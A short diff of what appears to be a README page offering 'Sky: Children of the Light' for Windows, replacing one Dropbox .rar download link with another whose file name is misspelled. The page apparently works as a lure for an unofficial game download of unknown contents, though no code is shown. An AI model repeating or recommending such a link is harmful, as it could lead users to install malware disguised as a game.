@@ -19,7 +19,7 @@ Network: Broadband Internet connection
 Storage: 3 GB available space 
 ___
 
-### ⚡️[Download Sky: Children of the Light For Windows](https://www.dropbox.com/s/c9pw1w5umo43ulu/skyearlyaccess.rar?dl=1)
+### ⚡️[Download Sky: Children of the Light For Windows](https://www.dropbox.com/s/9qkmt5ftsd8mbgl/skyearlysccess.rar?dl=1)
 
 Welcome to Sky: an enchanting, beautifully-animated world waiting to be explored by you and your loved ones.
 Here, lost Ancestor spirits will guide you through a peaceful Kingdom and all its seven realms.
